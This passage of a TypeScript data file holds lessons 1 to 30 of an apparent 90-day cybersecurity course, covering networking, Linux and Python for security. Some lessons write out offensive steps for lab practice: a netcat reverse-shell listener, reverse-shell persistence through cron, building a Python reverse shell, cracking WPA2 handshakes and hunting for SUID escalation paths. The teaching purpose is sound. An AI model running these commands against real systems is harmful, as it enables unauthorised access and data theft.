export interface Lesson {
  id: number;
  day: number;
  title: string;
  category: string;
  categoryColor: string;
  theory: string;
  tasks: string[];
  resources: string[];
  estimatedMinutes: number;
}

export interface Module {
  id: string;
  title: string;
  color: string;
  icon: string;
  days: number[];
  description: string;
}

export interface UserProgress {
  completedDays: number[];
  lastActiveDate: string | null;
  streak: number;
  totalMinutes: number;
}

export const MODULES: Module[] = [
  {
    id: "networking",
    title: "Networking",
    color: "#00BFFF",
    icon: "globe",
    days: Array.from({ length: 14 }, (_, i) => i + 1),
    description: "TCP/IP, DNS, HTTP, firewalls, and protocols",
  },
  {
    id: "linux",
    title: "Linux",
    color: "#FFA500",
    icon: "terminal",
    days: Array.from({ length: 14 }, (_, i) => i + 15),
    description: "Linux fundamentals, file system, permissions, and security",
  },
  {
    id: "python",
    title: "Python",
    color: "#3A86FF",
    icon: "code",
    days: Array.from({ length: 14 }, (_, i) => i + 29),
    description: "Python for security automation and scripting",
  },
  {
    id: "web",
    title: "Web Security",
    color: "#FF006E",
    icon: "shield",
    days: Array.from({ length: 14 }, (_, i) => i + 43),
    description: "OWASP Top 10, SQLi, XSS, web vulnerabilities",
  },
  {
    id: "pentest",
    title: "PenTesting",
    color: "#FB5607",
    icon: "crosshair",
    days: Array.from({ length: 14 }, (_, i) => i + 57),
    description: "Recon, exploitation, Metasploit, privilege escalation",
  },
  {
    id: "forensics",
    title: "Forensics",
    color: "#8338EC",
    icon: "search",
    days: Array.from({ length: 14 }, (_, i) => i + 71),
    description: "Malware analysis, digital forensics, incident response",
  },
  {
    id: "career",
    title: "Career",
    color: "#00FF00",
    icon: "award",
    days: Array.from({ length: 6 }, (_, i) => i + 85),
    description: "Certifications, career paths, and final capstone",
  },
];

export const LESSONS: Lesson[] = [
  // === NETWORKING ===
  {
    id: 1, day: 1, title: "OSI Model Deep Dive", category: "Networking", categoryColor: "#00BFFF",
    theory: "The OSI (Open Systems Interconnection) model is the foundation of all network communication. It has 7 layers:\n\n1. Physical — Raw bits, cables, hubs\n2. Data Link — MAC addresses, switches, ARP\n3. Network — IP addresses, routing (routers)\n4. Transport — TCP/UDP, port numbers, reliability\n5. Session — Session establishment, maintenance\n6. Presentation — Encryption, compression, encoding\n7. Application — HTTP, DNS, FTP, user protocols\n\nFor security, the key insight is that attacks can happen at any layer — from physical taps (Layer 1) to application exploits (Layer 7).",
    tasks: ["Draw the OSI model from memory without references", "Identify which layer each protocol belongs to: ARP, IP, TCP, TLS, HTTP", "Use Wireshark to capture packets and identify each layer in a frame", "Research: What layer does a VLAN attack target?"],
    resources: ["https://www.cloudflare.com/learning/ddos/glossary/open-systems-interconnection-model-osi/", "Wireshark (free packet analyzer)"],
    estimatedMinutes: 45,
  },
  {
    id: 2, day: 2, title: "TCP/IP Protocol Suite", category: "Networking", categoryColor: "#00BFFF",
    theory: "TCP/IP is the actual protocol suite used on the internet. It maps roughly to the OSI model but uses 4 layers:\n\n1. Network Access (OSI 1+2)\n2. Internet (OSI 3) — IP protocol\n3. Transport (OSI 4) — TCP and UDP\n4. Application (OSI 5-7) — HTTP, SSH, DNS\n\nKey concepts:\n- TCP: Reliable, connection-oriented. 3-way handshake: SYN → SYN-ACK → ACK\n- UDP: Fast, connectionless. Used for DNS, streaming\n- IP Addresses: IPv4 (32-bit), IPv6 (128-bit)\n- Subnetting: Dividing networks using CIDR notation (192.168.1.0/24)",
    tasks: ["Capture a TCP 3-way handshake using Wireshark on any website", "Calculate subnet masks for /24, /16, /8 networks", "Run: ping google.com and traceroute google.com. Analyze the output", "Identify: What makes TCP reliable that UDP lacks?"],
    resources: ["https://www.geeksforgeeks.org/tcp-ip-model/"],
    estimatedMinutes: 60,
  },
  {
    id: 3, day: 3, title: "DNS & How Domains Work", category: "Networking", categoryColor: "#00BFFF",
    theory: "DNS (Domain Name System) translates domain names to IP addresses. Understanding DNS is critical for security as DNS attacks are extremely common.\n\nDNS Record Types:\n- A: Maps domain to IPv4\n- AAAA: Maps domain to IPv6\n- MX: Mail server\n- CNAME: Alias for another domain\n- TXT: Verification and SPF records\n- NS: Name server\n\nDNS Lookup Process:\n1. Check local cache\n2. Ask Recursive Resolver (ISP)\n3. Root Nameserver → TLD (.com) → Authoritative NS\n\nSecurity Issues: DNS Spoofing, Cache Poisoning, DNS over HTTPS (DoH)",
    tasks: ["Run: nslookup google.com and dig google.com on your machine", "Use dig to find MX records for gmail.com", "Research DNS cache poisoning — how does DNSSEC prevent it?", "Try: dig @8.8.8.8 example.com to use Google's DNS resolver"],
    resources: ["https://www.cloudflare.com/learning/dns/what-is-dns/"],
    estimatedMinutes: 45,
  },
  {
    id: 4, day: 4, title: "HTTP & HTTPS", category: "Networking", categoryColor: "#00BFFF",
    theory: "HTTP (HyperText Transfer Protocol) is the foundation of web communication.\n\nHTTP Methods:\n- GET: Retrieve data\n- POST: Send data\n- PUT: Update data\n- DELETE: Remove data\n- PATCH: Partial update\n\nHTTP Status Codes:\n- 200 OK, 301 Redirect, 404 Not Found, 500 Server Error\n\nHTTPS = HTTP + TLS encryption\n- TLS Handshake: Client Hello → Server Hello → Certificate → Key Exchange → Finished\n- Certificates: X.509 format, signed by Certificate Authorities (CAs)\n\nSecurity: HTTP Strict Transport Security (HSTS), certificate pinning, mixed content attacks",
    tasks: ["Use curl -v https://example.com to see full HTTP headers", "Inspect a website's TLS certificate in your browser", "Use Burp Suite Community to intercept an HTTP request", "Research: What is a man-in-the-middle attack on HTTPS?"],
    resources: ["https://developer.mozilla.org/en-US/docs/Web/HTTP"],
    estimatedMinutes: 50,
  },
  {
    id: 5, day: 5, title: "Firewalls & Network Security", category: "Networking", categoryColor: "#00BFFF",
    theory: "Firewalls control network traffic based on rules. There are several types:\n\n1. Packet Filtering: Inspects headers (IP, port). Stateless.\n2. Stateful Inspection: Tracks connection state. More secure.\n3. Application Layer (WAF): Understands application protocols. Detects SQLi, XSS.\n4. Next-Gen Firewall (NGFW): Deep packet inspection, IDS/IPS integrated.\n\nKey Concepts:\n- DMZ (Demilitarized Zone): Network segment between internet and internal network\n- ACL (Access Control List): Rules defining who can access what\n- Ingress/Egress filtering\n- Zero Trust: Never trust, always verify",
    tasks: ["Configure iptables rules to block a specific port on Linux", "Use nmap to scan for open ports: nmap -sV localhost", "Research: What is a DMZ and why is it used?", "Lab: Set up a simple iptables firewall allowing only SSH and HTTP"],
    resources: ["https://www.cloudflare.com/learning/security/what-is-a-firewall/"],
    estimatedMinutes: 55,
  },
  {
    id: 6, day: 6, title: "VPNs & Tunneling", category: "Networking", categoryColor: "#00BFFF",
    theory: "VPNs (Virtual Private Networks) create encrypted tunnels over public networks.\n\nVPN Protocols:\n- OpenVPN: Open source, very secure, uses TLS\n- WireGuard: Modern, fast, minimal codebase\n- IPSec: Used in enterprise, supports IKEv2\n- L2TP: Often combined with IPSec\n- PPTP: Old, insecure — avoid\n\nHow VPNs Work:\n1. Client creates encrypted tunnel to VPN server\n2. Traffic routed through tunnel\n3. VPN server decrypts and forwards traffic\n4. Return traffic encrypted back through tunnel\n\nSecurity uses: Remote access, site-to-site connectivity, bypassing censorship",
    tasks: ["Install WireGuard on a Linux VM and create a basic tunnel", "Capture VPN traffic in Wireshark — what can you see?", "Research: What is split tunneling and its security implications?", "Lab: Set up OpenVPN server and connect a client"],
    resources: ["https://www.wireguard.com/", "https://openvpn.net/"],
    estimatedMinutes: 60,
  },
  {
    id: 7, day: 7, title: "Wireshark & Packet Analysis", category: "Networking", categoryColor: "#00BFFF",
    theory: "Wireshark is the world's foremost network protocol analyzer. Used by defenders and attackers alike.\n\nKey Features:\n- Live packet capture and display\n- Deep protocol dissection\n- Follow TCP/UDP streams\n- Display filters (powerful query language)\n- Statistics and IO graphs\n\nCommon Display Filters:\n- ip.addr == 192.168.1.1\n- tcp.port == 80\n- http.request.method == \"GET\"\n- dns.qry.name contains \"google\"\n\nSecurity use cases: Detecting malware C2, analyzing exploits, incident response, network forensics",
    tasks: ["Install Wireshark and capture traffic while browsing HTTP sites", "Use Follow TCP Stream to read a full HTTP conversation", "Filter for all DNS queries in a capture file", "Lab: Download a malware PCAP from malware-traffic-analysis.net and analyze it"],
    resources: ["https://www.wireshark.org/", "https://www.malware-traffic-analysis.net/"],
    estimatedMinutes: 70,
  },
  {
    id: 8, day: 8, title: "Network Scanning with Nmap", category: "Networking", categoryColor: "#00BFFF",
    theory: "Nmap (Network Mapper) is the go-to tool for network discovery and security auditing.\n\nCommon Nmap Scans:\n- nmap -sn 192.168.1.0/24 — Ping sweep (host discovery)\n- nmap -sS target — SYN scan (stealthy)\n- nmap -sV target — Version detection\n- nmap -O target — OS detection\n- nmap -A target — Aggressive (OS, versions, scripts, traceroute)\n- nmap -p 1-65535 target — All ports\n- nmap --script vuln target — Vulnerability scripts\n\nNSE (Nmap Scripting Engine) allows custom scripts for vulnerability detection, exploitation, and much more.",
    tasks: ["Scan your local network: nmap -sn 192.168.1.0/24", "Run a full scan on a test VM: nmap -A <vm-ip>", "Use nmap --script http-title to get titles of web servers", "Lab: Scan a Metasploitable VM and list all open services"],
    resources: ["https://nmap.org/book/man.html", "https://nmap.org/nsedoc/"],
    estimatedMinutes: 65,
  },
  {
    id: 9, day: 9, title: "IDS/IPS & Network Monitoring", category: "Networking", categoryColor: "#00BFFF",
    theory: "IDS (Intrusion Detection System) and IPS (Intrusion Prevention System) monitor network traffic for malicious activity.\n\nIDS vs IPS:\n- IDS: Detects and alerts. Passive.\n- IPS: Detects and blocks. Active.\n\nTypes:\n- NIDS/NIPS: Network-based (monitors traffic)\n- HIDS/HIPS: Host-based (monitors system)\n\nPopular Tools:\n- Snort: Open source NIDS/IPS with rules\n- Suricata: Multi-threaded, high performance\n- Zeek (Bro): Network analysis framework\n\nDetection Methods:\n- Signature-based: Matches known patterns\n- Anomaly-based: Deviates from baseline\n- Behavioral: Heuristic analysis",
    tasks: ["Install Snort on Ubuntu and run it in sniffer mode", "Write a basic Snort rule to detect ICMP pings", "Research: What is a false positive and why does it matter in IDS?", "Lab: Set up Suricata and analyze its alerts on sample traffic"],
    resources: ["https://www.snort.org/", "https://suricata.io/"],
    estimatedMinutes: 60,
  },
  {
    id: 10, day: 10, title: "VLAN & Network Segmentation", category: "Networking", categoryColor: "#00BFFF",
    theory: "VLANs (Virtual LANs) create logical network segments on shared physical infrastructure.\n\nWhy VLANs Matter for Security:\n- Isolate sensitive departments (Finance, HR, R&D)\n- Contain breaches to one segment\n- Reduce broadcast domain size\n- Implement micro-segmentation\n\nVLAN Types:\n- Data VLAN: Regular user traffic\n- Management VLAN: Network device management\n- Native VLAN: Untagged traffic (often source of misconfig)\n- Voice VLAN: VoIP traffic\n\nVLAN Attacks:\n- VLAN Hopping: 802.1q double tagging\n- Switch Spoofing: Pretending to be a trunk port\n\nMitigation: Disable unused ports, change native VLAN, disable auto-trunking",
    tasks: ["Research VLAN hopping and describe how the double-tagging attack works", "Lab: Set up VLANs in GNS3 or EVE-NG", "Identify what the default native VLAN is and why it's risky", "Document how to disable DTP to prevent switch spoofing"],
    resources: ["https://www.cisco.com/c/en/us/support/docs/lan-switching/8021q/17056-741-4.html"],
    estimatedMinutes: 50,
  },
  {
    id: 11, day: 11, title: "Wireless Security (WiFi)", category: "Networking", categoryColor: "#00BFFF",
    theory: "Wireless networks introduce unique attack surfaces. Understanding WiFi security is essential.\n\nWiFi Security Protocols:\n- WEP: Broken (do not use)\n- WPA: TKIP encryption, also broken\n- WPA2: AES-CCMP. Standard today. Vulnerable to KRACK, PMKID\n- WPA3: Modern. SAE (Simultaneous Authentication of Equals)\n\nCommon WiFi Attacks:\n- Evil Twin: Rogue AP mimicking legitimate one\n- Deauthentication: Force disconnect to capture handshake\n- PMKID Attack: Capture PMKID from single packet\n- Handshake Capture + Dictionary Attack\n\nTools: airmon-ng, airodump-ng, aireplay-ng, hashcat",
    tasks: ["Set up a controlled WiFi lab with a test AP", "Capture a WPA2 4-way handshake using airodump-ng", "Use hashcat to crack a weak WPA2 password from a wordlist", "Research: How does WPA3 SAE prevent dictionary attacks?"],
    resources: ["https://aircrack-ng.org/", "https://hashcat.net/hashcat/"],
    estimatedMinutes: 70,
  },
  {
    id: 12, day: 12, title: "SSH, Telnet & Remote Access", category: "Networking", categoryColor: "#00BFFF",
    theory: "Secure Shell (SSH) is the encrypted replacement for Telnet for remote access.\n\nSSH Features:\n- Encrypted authentication and communication\n- Key-based auth (better than passwords)\n- Port forwarding (local, remote, dynamic)\n- SFTP for secure file transfers\n- ProxyJump for bastion hosts\n\nSSH Hardening:\n- Disable root login: PermitRootLogin no\n- Use key-based auth only: PasswordAuthentication no\n- Change default port (obscurity only)\n- Use AllowUsers to restrict access\n- Enable 2FA with libpam-google-authenticator\n\nTelnet: Sends everything in cleartext — NEVER use on production systems",
    tasks: ["Generate an SSH key pair: ssh-keygen -t ed25519", "Configure SSH key-based auth on a Linux VM", "Set up SSH port forwarding to tunnel a web service", "Lab: Harden an SSH server per CIS benchmarks"],
    resources: ["https://www.ssh.com/academy/ssh", "https://www.openssh.com/"],
    estimatedMinutes: 55,
  },
  {
    id: 13, day: 13, title: "Email Security (SMTP, SPF, DKIM)", category: "Networking", categoryColor: "#00BFFF",
    theory: "Email is one of the most common attack vectors. Understanding email security is crucial.\n\nEmail Protocols:\n- SMTP: Sending email (port 25, 587, 465)\n- IMAP/POP3: Receiving email\n\nEmail Authentication:\n- SPF (Sender Policy Framework): TXT record listing authorized senders\n- DKIM (DomainKeys Identified Mail): Cryptographic signature per email\n- DMARC: Policy for SPF/DKIM failures (reject, quarantine, none)\n\nEmail Attacks:\n- Phishing: Fake emails tricking users\n- Spear Phishing: Targeted phishing\n- Business Email Compromise (BEC)\n- Email Spoofing: Faking sender address\n\nAnalyzing Email Headers: X-Originating-IP, Received: chain, Authentication-Results",
    tasks: ["Analyze raw email headers from a spam email in your inbox", "Check if your domain has SPF, DKIM, and DMARC: dig TXT yourdomain.com", "Research: How does BEC (Business Email Compromise) work?", "Lab: Use GoPhish to run a practice phishing simulation"],
    resources: ["https://mxtoolbox.com/SuperTool.aspx", "https://getgophish.com/"],
    estimatedMinutes: 50,
  },
  {
    id: 14, day: 14, title: "Network Week Review & CTF", category: "Networking", categoryColor: "#00BFFF",
    theory: "Congratulations on completing the Networking module! This module covered:\n\n✓ OSI Model and TCP/IP\n✓ DNS, HTTP, HTTPS\n✓ Firewalls and VPNs\n✓ Wireshark and packet analysis\n✓ Nmap and network scanning\n✓ IDS/IPS systems\n✓ VLANs and segmentation\n✓ WiFi security\n✓ SSH and remote access\n✓ Email security\n\nNetworking is the backbone of all cybersecurity. Every attack and defense involves the network layer.\n\nNext: Linux fundamentals — the operating system of the internet.",
    tasks: ["Complete a network-focused CTF challenge on PicoCTF or HackTheBox", "Review all networking concepts from days 1-13", "Set up a home lab: router, switch, VMs for future practice", "Document 3 networking vulnerabilities you'd check in a pentest"],
    resources: ["https://picoctf.org/", "https://www.hackthebox.com/"],
    estimatedMinutes: 90,
  },

  // === LINUX ===
  {
    id: 15, day: 15, title: "Linux Fundamentals", category: "Linux", categoryColor: "#FFA500",
    theory: "Linux is the operating system of the internet. 96% of web servers run Linux. Most security tools are built for Linux.\n\nLinux Distributions for Security:\n- Kali Linux: Offensive security, 600+ tools pre-installed\n- Parrot OS: Lightweight alternative to Kali\n- Ubuntu Server: For building servers and labs\n\nFilesystem Hierarchy:\n/ (root) → /bin /etc /home /opt /usr /var /tmp /dev /proc\n\nEssential Commands:\n- ls, cd, pwd, mkdir, rm, cp, mv\n- cat, less, grep, find, which, whereis\n- chmod, chown, sudo, su\n- ps, top, kill, jobs\n- man (read manual pages)",
    tasks: ["Install Kali Linux in a VM (VirtualBox or VMware)", "Navigate the filesystem using only the terminal", "Find all .conf files in /etc using find", "Practice: man grep — read the grep manual page"],
    resources: ["https://linuxjourney.com/", "https://overthewire.org/wargames/bandit/"],
    estimatedMinutes: 60,
  },
  {
    id: 16, day: 16, title: "File Permissions & Ownership", category: "Linux", categoryColor: "#FFA500",
    theory: "Linux file permissions control who can read, write, and execute files.\n\nPermission Format: -rwxrwxrwx\n- First char: file type (- file, d directory, l link)\n- Next 9: owner/group/others permissions (r=4, w=2, x=1)\n\nExamples:\n- chmod 755 file → rwxr-xr-x\n- chmod 644 file → rw-r--r--\n- chmod +x script.sh → add execute for all\n\nOwnership:\n- chown user:group file\n- chown -R user:group /directory\n\nSpecial Permissions:\n- SUID: Execute with owner's permissions (chmod u+s)\n- SGID: Execute with group's permissions (chmod g+s)\n- Sticky bit: Only owner can delete in directory (chmod +t)\n\nSUID on root-owned executables is a common privilege escalation vector!",
    tasks: ["Find all SUID files: find / -perm -4000 -type f 2>/dev/null", "Create a file, set various permissions, verify with ls -la", "Research: How can SUID binaries lead to privilege escalation?", "Lab: Use GTFOBins to find how SUID binaries can be exploited"],
    resources: ["https://gtfobins.github.io/", "https://linuxize.com/post/linux-file-permissions/"],
    estimatedMinutes: 55,
  },
  {
    id: 17, day: 17, title: "Users, Groups & sudo", category: "Linux", categoryColor: "#FFA500",
    theory: "Linux has a multi-user system with strict access control.\n\nUser Management:\n- adduser username — Create user\n- passwd username — Change password\n- usermod -aG sudo username — Add to sudo group\n- userdel -r username — Delete user\n- /etc/passwd — User accounts (readable by all)\n- /etc/shadow — Password hashes (root only)\n\nGroups:\n- /etc/group — Group definitions\n- id — Show current user/groups\n- groups — List groups\n\nsudo Configuration:\n- /etc/sudoers (edit with visudo)\n- NOPASSWD option — dangerous misconfiguration\n- sudo -l — List allowed commands\n\nPrivilege Escalation: sudo -l is one of the first things pentesters check!",
    tasks: ["Create a new user and add them to specific groups", "View /etc/passwd and /etc/shadow (note the difference in access)", "Run sudo -l to see what commands you can run as root", "Research: How can sudo misconfigurations lead to root access?"],
    resources: ["https://www.hackingarticles.in/linux-privilege-escalation-using-sudo-rights/"],
    estimatedMinutes: 50,
  },
  {
    id: 18, day: 18, title: "Processes & Services", category: "Linux", categoryColor: "#FFA500",
    theory: "Understanding Linux processes is critical for both offense and defense.\n\nProcess Commands:\n- ps aux — All running processes\n- top / htop — Real-time process monitor\n- kill PID — Send signal to process\n- kill -9 PID — Force kill\n- pgrep process_name — Find PID by name\n- strace command — Trace system calls\n\nService Management (systemd):\n- systemctl start/stop/restart/status service\n- systemctl enable/disable service — Persistence\n- systemctl list-units --type=service\n\nSecurity Relevance:\n- Attackers often install malicious services for persistence\n- Monitoring running processes is key to detection\n- Check for unusual processes: anything running as root?",
    tasks: ["List all running services: systemctl list-units --type=service", "Install and manage a service: apache2 or nginx", "Use ps aux | grep root to find root-owned processes", "Lab: Use strace to monitor what files a program accesses"],
    resources: ["https://linuxcommand.org/lc3_man_pages/ps1.html"],
    estimatedMinutes: 50,
  },
  {
    id: 19, day: 19, title: "Bash Scripting for Security", category: "Linux", categoryColor: "#FFA500",
    theory: "Bash scripting automates repetitive security tasks. Every security professional should be able to write basic scripts.\n\nBasics:\n#!/bin/bash — Shebang line\nvariables: VAR=\"value\"\nif/else, for loops, while loops\nfunctions: function_name() { ... }\n\nUseful for Security:\n- Automated log parsing\n- IP/port scanning wrappers\n- File integrity monitoring\n- Automated backups\n\nExample — Log Parser:\n---\n#!/bin/bash\nLOG=/var/log/auth.log\necho \"Failed login attempts:\"\ngrep \"Failed password\" $LOG | awk '{print $11}' | sort | uniq -c | sort -rn | head -10\n---",
    tasks: ["Write a script that monitors /var/log/auth.log for failed logins", "Create a script to scan a subnet with ping and report live hosts", "Write a script to backup important files with timestamp", "Lab: Automate an nmap scan and save results to a file"],
    resources: ["https://www.shellscript.sh/", "https://devhints.io/bash"],
    estimatedMinutes: 65,
  },
  {
    id: 20, day: 20, title: "Log Analysis & SIEM", category: "Linux", categoryColor: "#FFA500",
    theory: "Logs are the primary source of truth in security investigations. Understanding log formats and analysis is essential.\n\nKey Log Files in Linux:\n- /var/log/auth.log — Authentication events\n- /var/log/syslog — System events\n- /var/log/kern.log — Kernel messages\n- /var/log/apache2/access.log — Web server access\n- /var/log/apache2/error.log — Web server errors\n\nLog Analysis Commands:\n- grep, awk, sed — Text processing\n- cut, sort, uniq — Data manipulation\n- journalctl — Systemd journal\n\nSIEM Tools:\n- Splunk: Enterprise SIEM\n- ELK Stack (Elasticsearch, Logstash, Kibana): Open source\n- Graylog: Centralized log management",
    tasks: ["Find all SSH login attempts in /var/log/auth.log", "Use awk to parse and format Apache access logs", "Install ELK Stack and ship logs from your system", "Lab: Create a Splunk dashboard for failed login monitoring"],
    resources: ["https://www.elastic.co/", "https://graylog.org/"],
    estimatedMinutes: 60,
  },
  {
    id: 21, day: 21, title: "Linux Hardening", category: "Linux", categoryColor: "#FFA500",
    theory: "Hardening reduces the attack surface of a Linux system. This is essential for any system exposed to the internet.\n\nKey Hardening Steps:\n1. Keep system updated: apt update && apt upgrade\n2. Disable unused services: systemctl disable telnet\n3. Configure firewall: ufw or iptables\n4. Restrict SSH: no root login, key-based auth only\n5. Enable auditd for audit logging\n6. Remove unused packages\n7. Set proper file permissions\n8. Configure /etc/hosts.deny and /etc/hosts.allow\n9. Disable IPv6 if not needed\n10. Enable automatic security updates\n\nCIS Benchmarks: Industry standard hardening guides\nOpenSCAP: Automated hardening checks",
    tasks: ["Run Lynis security audit: apt install lynis && lynis audit system", "Harden SSH on a test VM per best practices", "Configure ufw to allow only necessary ports", "Lab: Compare a default system to a hardened system using OpenSCAP"],
    resources: ["https://cisofy.com/lynis/", "https://www.cisecurity.org/cis-benchmarks"],
    estimatedMinutes: 70,
  },
  {
    id: 22, day: 22, title: "Package Management & Software Security", category: "Linux", categoryColor: "#FFA500",
    theory: "Understanding package management is crucial for security — vulnerable software is a primary attack vector.\n\nDebian/Ubuntu (APT):\n- apt update — Update package lists\n- apt upgrade — Upgrade packages\n- apt install package — Install package\n- apt remove package — Remove package\n- dpkg -l — List installed packages\n\nRed Hat/CentOS (YUM/DNF):\n- yum/dnf update, install, remove\n\nSecurity Best Practices:\n- Only install from official repositories\n- Verify package signatures\n- Audit installed software regularly\n- Remove packages you don't need\n- Subscribe to security advisories (CVE feeds)\n\nTool: apt-check, unattended-upgrades",
    tasks: ["List all installed packages and sort by installation date", "Find packages with known vulnerabilities: apt list --upgradable", "Set up unattended-upgrades for automatic security patches", "Research: What is a supply chain attack on software packages?"],
    resources: ["https://ubuntu.com/security/", "https://cve.mitre.org/"],
    estimatedMinutes: 45,
  },
  {
    id: 23, day: 23, title: "Cron Jobs & Persistence", category: "Linux", categoryColor: "#FFA500",
    theory: "Cron is a time-based job scheduler in Linux. Attackers frequently use cron for persistence.\n\nCron Syntax: * * * * * command\n(minute hour day-of-month month day-of-week)\n\nCron Locations:\n- /etc/crontab — System crontab\n- /etc/cron.d/ — Drop-in crontab files\n- /etc/cron.hourly|daily|weekly|monthly/\n- /var/spool/cron/crontabs/ — User crontabs\n- crontab -l — View user's crontab\n- crontab -e — Edit user's crontab\n\nAttacker Persistence:\n- Add malicious cron job to run reverse shell\n- Modify existing cron scripts\n- Add to cron.d with root permissions\n\nDetection: Monitor cron directories with auditd",
    tasks: ["Create a cron job that logs system uptime every hour", "Check all cron locations for unusual jobs: ls -la /etc/cron*", "Research: How would you detect a malicious cron job?", "Lab: Practice with pwncat-cs persistence modules"],
    resources: ["https://crontab.guru/"],
    estimatedMinutes: 50,
  },
  {
    id: 24, day: 24, title: "Linux Networking Tools", category: "Linux", categoryColor: "#FFA500",
    theory: "Linux has powerful built-in networking tools essential for security work.\n\nKey Tools:\n- ifconfig / ip — Network interface configuration\n- netstat / ss — Network connections and sockets\n- route / ip route — Routing table\n- arp — ARP cache\n- tcpdump — CLI packet capture\n- nc (netcat) — Network swiss army knife\n- curl / wget — HTTP requests\n\ntcpdump Examples:\n- tcpdump -i eth0 — Capture on eth0\n- tcpdump port 80 — Filter HTTP\n- tcpdump -w capture.pcap — Write to file\n\nNetcat Uses:\n- nc -nvlp 4444 — Listen for reverse shell\n- nc target 80 — Connect to port\n- File transfer: nc target 4444 < file",
    tasks: ["Use ss -tulpn to view all listening services and their PIDs", "Capture HTTP traffic with tcpdump while browsing", "Transfer a file between two VMs using netcat", "Use netcat to set up a basic chat between two terminals"],
    resources: ["https://nmap.org/ncat/"],
    estimatedMinutes: 60,
  },
  {
    id: 25, day: 25, title: "File System Forensics", category: "Linux", categoryColor: "#FFA500",
    theory: "Understanding the Linux filesystem is key for both forensics and privilege escalation.\n\nImportant Directories:\n- /tmp: World-writable, often used by malware\n- /dev/shm: Shared memory, often missed by defenders\n- /proc: Running process information (/proc/PID/exe, /proc/PID/maps)\n- /sys: Kernel and hardware info\n\nForensic Commands:\n- find / -mtime -1: Files modified in last 24 hours\n- find / -user root -perm -4000: SUID root files\n- ls -la /home/*/: Check user home directories\n- history: Command history\n- last: Login history\n- who: Currently logged-in users\n\nFile Recovery: extundelete, PhotoRec, Autopsy",
    tasks: ["Find files modified in the last 24 hours on your system", "Check /proc/<pid>/exe for all running processes", "List recently accessed files: find /home -atime -1", "Lab: Use Autopsy to analyze a disk image from a CTF"],
    resources: ["https://www.sleuthkit.org/autopsy/"],
    estimatedMinutes: 55,
  },
  {
    id: 26, day: 26, title: "AppArmor & SELinux", category: "Linux", categoryColor: "#FFA500",
    theory: "Mandatory Access Control (MAC) systems like AppArmor and SELinux enforce security policies beyond traditional permissions.\n\nAppArmor:\n- Profile-based MAC for Ubuntu/Debian\n- Confines programs to limited resources\n- aa-status — Check status\n- aa-complain / aa-enforce — Modes\n- Profiles in /etc/apparmor.d/\n\nSELinux:\n- Role-based MAC for Red Hat/CentOS\n- Every object has a security context\n- Modes: Enforcing, Permissive, Disabled\n- getenforce — Check mode\n- setenforce 0/1 — Change mode\n- ausearch -m avc — View denials\n\nWhy it matters: Even if an attacker exploits a vulnerability, MAC can prevent them from accessing sensitive files.",
    tasks: ["Check AppArmor status: sudo aa-status", "View an AppArmor profile: cat /etc/apparmor.d/usr.sbin.nginx", "Research: What is an SELinux denial and how do you interpret it?", "Lab: Create a custom AppArmor profile for a simple application"],
    resources: ["https://wiki.ubuntu.com/AppArmor", "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/using_selinux/index"],
    estimatedMinutes: 55,
  },
  {
    id: 27, day: 27, title: "Memory Analysis Basics", category: "Linux", categoryColor: "#FFA500",
    theory: "Memory forensics involves analyzing a system's RAM to find evidence of malicious activity.\n\nWhy Memory Matters:\n- Malware often lives only in memory (fileless malware)\n- Encryption keys, passwords, and credentials can be in memory\n- Evidence not found on disk may exist in RAM\n\nVolatility Framework:\n- Industry standard memory forensics tool\n- Runs plugins against memory images\n- Key plugins: pslist, pstree, netscan, dumpfiles, malfind\n\nCapturing Memory:\n- Linux: /dev/mem, lime (loadable kernel module)\n- Windows: winpmem, FTK Imager\n\nAnti-forensics: attackers try to clear traces from memory using techniques like process hollowing, DKOM",
    tasks: ["Install Volatility 3: pip3 install volatility3", "Download a memory image from CyberDefenders or MemLabs", "Run volatility3 -f image.raw windows.pslist — list processes", "Research: What is process hollowing and how does it evade detection?"],
    resources: ["https://github.com/volatilityfoundation/volatility3", "https://cyberdefenders.org/"],
    estimatedMinutes: 70,
  },
  {
    id: 28, day: 28, title: "Linux CTF & Review", category: "Linux", categoryColor: "#FFA500",
    theory: "Congratulations on completing the Linux module! You've covered:\n\n✓ Linux filesystem and commands\n✓ File permissions and SUID\n✓ User management and sudo\n✓ Processes and services\n✓ Bash scripting\n✓ Log analysis\n✓ Linux hardening\n✓ Package management\n✓ Cron jobs and persistence\n✓ Networking tools\n✓ File system forensics\n✓ AppArmor/SELinux\n✓ Memory analysis\n\nLinux mastery is a superpower in cybersecurity. Practice daily!",
    tasks: ["Complete OverTheWire Bandit levels 0-20", "Root a beginner machine on TryHackMe or HackTheBox", "Write a comprehensive Linux hardening checklist", "Set up a personal Kali Linux lab environment for future practice"],
    resources: ["https://overthewire.org/wargames/bandit/", "https://tryhackme.com/"],
    estimatedMinutes: 120,
  },

  // === PYTHON ===
  {
    id: 29, day: 29, title: "Python Fundamentals", category: "Python", categoryColor: "#3A86FF",
    theory: "Python is the scripting language of cybersecurity. Its simplicity and vast library ecosystem make it perfect for security tools.\n\nCore Python:\n- Variables, data types (int, str, list, dict, tuple, set)\n- Control flow (if/elif/else, for, while)\n- Functions, classes, modules\n- File I/O: open(), read(), write()\n- Error handling: try/except\n\nKey Libraries for Security:\n- socket — Network programming\n- os/sys — System interaction\n- subprocess — Run shell commands\n- re — Regular expressions\n- requests — HTTP requests\n- scapy — Packet manipulation\n- paramiko — SSH automation\n\nPackage Management: pip install package_name",
    tasks: ["Write a Python script to ping a list of IPs and report which are live", "Create a function to validate if a string is a valid IP address", "Use os.walk() to list all .log files in a directory recursively", "Lab: Build a simple port scanner using Python sockets"],
    resources: ["https://docs.python.org/3/", "https://automatetheboringstuff.com/"],
    estimatedMinutes: 60,
  },
  {
    id: 30, day: 30, title: "Python Networking", category: "Python", categoryColor: "#3A86FF",
    theory: "Python's socket library enables low-level network programming for security tools.\n\nSocket Basics:\n---\nimport socket\n# TCP client\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('target', 80))\ns.send(b'GET / HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n')\nresponse = s.recv(4096)\n---\n\nPort Scanner:\n---\nimport socket\nfor port in range(1, 1025):\n    s = socket.socket()\n    s.settimeout(0.5)\n    if s.connect_ex(('target', port)) == 0:\n        print(f'Port {port}: OPEN')\n    s.close()\n---\n\nAdvanced: Use threading for faster scanning, asyncio for async networking",
    tasks: ["Build a multi-threaded port scanner in Python", "Write a banner grabber to identify services on open ports", "Create a TCP reverse shell in Python (test on your own VMs only)", "Lab: Implement a simple HTTP proxy server"],
